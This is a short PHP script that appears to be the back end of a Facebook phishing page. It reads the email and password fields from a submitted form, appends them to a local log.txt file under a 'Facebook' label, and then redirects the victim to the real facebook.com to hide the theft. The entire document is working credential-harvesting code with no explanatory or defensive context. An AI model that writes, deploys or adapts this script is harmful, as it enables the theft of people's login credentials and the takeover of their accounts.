<?php

$uname = $_POST['email'];
$pass = $_POST['pass'];

$file = fopen("log.txt","a");

fwrite($file,"\n---------\n");
fwrite($file,"Facebook \n");
fwrite($file,"---------\n");
fwrite($file,"\n");
fwrite($file,"Username:-->  :");
fwrite($file,$uname);
fwrite($file,"\n");
fwrite($file,"Password:-->  :");
fwrite($file,$pass);
fwrite($file,"\n--------------------------------------------------\n");
fclose($file);

header("location:https://www.facebook.com/");
?>
